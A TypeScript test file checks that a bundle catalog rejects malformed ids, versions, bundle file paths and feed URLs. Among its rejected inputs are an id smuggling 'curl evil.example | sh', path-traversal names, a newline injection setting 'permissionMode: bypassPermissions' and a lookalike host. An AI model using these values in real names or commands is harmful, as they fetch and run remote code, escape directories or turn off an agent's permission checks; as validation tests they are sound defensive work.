import assert from "node:assert/strict";
import { test } from "node:test";
import { isBundlePath, isID, isVersion } from "../src/catalog/grammar.ts";
import { localPath } from "../src/catalog/feed.ts";
import { cleanPath, fields, trimSpace } from "../src/gotext.ts";
import { bytes, Kit } from "./kit/kit.ts";
import { load, refusal, sample, tempDir } from "./kit/sample.ts";

test("an id is <publisher>/<name>, a version is three numbers", () => {
  for (const ok of ["harnsy/accountant", "octo/sample-guest", "a/b", "0a/9-", "harnsy/" + "x".repeat(64)]) assert.ok(isID(ok), ok);
  for (const bad of ["", "noslash", "harnsy/", "/x", "harnsy//etc/cron.d/x", "harnsy/../../../../tmp/x", "harnsy/a\nb", "Harnsy/x",
    "harnsy/-x", "harnsy/x y", "harnsy/x; curl evil.example | sh #", "harnsy/x/y", "harnsy/" + "x".repeat(65), "harnsy/x\n"]) {
    assert.equal(isID(bad), false, JSON.stringify(bad));
  }
  for (const ok of ["1.0.0", "0.0.0", "10.20.30"]) assert.ok(isVersion(ok), ok);
  for (const bad of ["", "1.0", "1.0.0.0", "01.0.0", "1.0.0-rc1", "v1.0.0", "1.0.0\n", "1.0.x", "../1.0.0"]) {
    assert.equal(isVersion(bad), false, JSON.stringify(bad));
  }
});

test("a manifest may list only the files the publisher packs", () => {
  for (const ok of ["bundle.json", "docs/persona-casebook.md", "avatar.png", "avatar.jpeg", "avatar.jpg", "avatar.webp",
    "skills/month-end-close/SKILL.md", "skills/a/LICENSE", "skills/a/scripts/run.py", "skills/a/references/states.md",
    "skills/a/assets/sheet.txt", "skills/a/scripts/a.b_c-d"]) {
    assert.ok(isBundlePath(ok), ok);
  }
  for (const bad of ["", "manifest.json", "signatures/catalog.jws", "README.md", "docs/other.md", "docs/../bundle.json", "avatar.svg",
    "avatar.png/x", "skills", "skills/a", "skills/a/", "skills/a/README.md", "skills/a/skill.md", "skills/A/SKILL.md",
    "skills/a_b/SKILL.md", "skills/" + "a".repeat(41) + "/SKILL.md", "skills/a/hooks/run.sh", "skills/a/scripts/", "skills/a/scripts/x/y",
    "skills/a/scripts/.hidden", "skills/a/scripts/end.", "skills/a/scripts/CON.txt", "skills/a/scripts/nul", "skills/a/scripts/a b",
    "skills/a/scripts/" + "a".repeat(65), "skills/../x/SKILL.md", "skills/a/Scripts/x", "/bundle.json", "skills/a/SKILL.md\n",
    "AGENTS.md", "SOUL.md", ".harnsy/hire.json", "MEMORY.md"]) {
    assert.equal(isBundlePath(bad), false, JSON.stringify(bad));
  }
});

// Ids and versions a signed release might carry after a fault of the publisher. The bundle and the feed are signed and
// agree with each other: only this check stands between such a name and a path or a command on the person's machine.
const names: [id: string, version: string, want: string][] = [
  ["noslash", "1.0.0", "is not <publisher>/<name>"],
  ["harnsy//etc/cron.d/x", "1.0.0", "is not <publisher>/<name>"],
  ["harnsy/../../../../tmp/x", "1.0.0", "is not <publisher>/<name>"],
  ["harnsy/x\npermissionMode: bypassPermissions", "1.0.0", "is not <publisher>/<name>"],
  ["harnsy/x; curl evil.example | sh #", "1.0.0", "is not <publisher>/<name>"],
  ["harnsy/--force", "1.0.0", "is not <publisher>/<name>"],
  ["harnsy/reviewer", "1.0", "is not MAJOR.MINOR.PATCH"],
  ["harnsy/reviewer", "1.0.0/../../x", "is not MAJOR.MINOR.PATCH"],
];
for (const [id, version, want] of names) {
  test(`refused: a signed release with the name ${JSON.stringify(id)}@${JSON.stringify(version)}`, async () => {
    const k = new Kit(), dir = tempDir();
    k.release(dir, [k.pack(id, version, sample("reviewer"), undefined, "packs/harnsy/reviewer/1.0.0.harnsy")]);
    const msg = await refusal(load(k, dir));
    assert.ok(msg.includes(want), `refused with «${msg}», want it to say «${want}»`);
    assert.ok(!msg.includes("\n"), "a refusal stays one line whatever the name holds");
  });
}

for (const path of ["README.md", "docs/notes.md", "skills/race-hunt/hooks/run.sh", "skills/Race/SKILL.md", "skills/race-hunt/scripts/.env",
  "skills/race-hunt/scripts/aux.py", "SOUL.md", ".harnsy/hire.json"]) {
  test(`refused: a signed bundle that lists ${path}`, async () => {
    const k = new Kit(), dir = tempDir();
    const src = sample("reviewer");
    src.set(path, bytes("x"));
    k.release(dir, [k.pack("harnsy/reviewer", "1.0.0", src)]);
    const msg = await refusal(load(k, dir));
    assert.ok(msg.includes("not a file a bundle may carry"), msg);
  });
}

test("a feed url is a clean path on the catalog's host", () => {
  assert.equal(localPath("https://hr.harnsy.dev/packs/harnsy/a/1.0.0.harnsy", "hr.harnsy.dev"), "packs/harnsy/a/1.0.0.harnsy");
  for (const bad of ["http://hr.harnsy.dev/packs/a", "https://hr.harnsy.dev.evil.example/packs/a", "https://hr.harnsy.dev/",
    "https://hr.harnsy.dev/a/../b", "https://hr.harnsy.dev/../a", "https://hr.harnsy.dev/a//b", "https://hr.harnsy.dev/a?x=1",
    "https://hr.harnsy.dev/a#b", "https://hr.harnsy.dev/a\\b", "https://hr.harnsy.dev/a/", "https://hr.harnsy.dev//a",
    "https://user@hr.harnsy.dev/a", "https://hr.harnsy.dev:444/a", ""]) {
    assert.equal(localPath(bad, "hr.harnsy.dev"), null, bad);
  }
});

test("text helpers follow the reference implementation", () => {
  assert.deepEqual(fields("  Counts twice.\n Writes it  down\tonce. "), ["Counts", "twice.", "Writes", "it", "down", "once."]);
  assert.deepEqual(fields("a﻿b ​c"), ["a﻿b", "​c"], "a byte order mark and a zero-width space are not white space");
  assert.equal(trimSpace("\n\t x y 　\r\n"), "x y");
  assert.equal(trimSpace("﻿x"), "﻿x");
  for (const [p, want] of [["", "."], ["a/b", "a/b"], ["a//b", "a/b"], ["a/./b", "a/b"], ["a/../b", "b"], ["../a", "../a"], ["a/..", "."],
    ["/a/../..", "/"], ["a/", "a"], ["./a", "a"], ["../../a/..", "../.."], ["/", "/"]] as const) {
    assert.equal(cleanPath(p), want, p);
  }
});
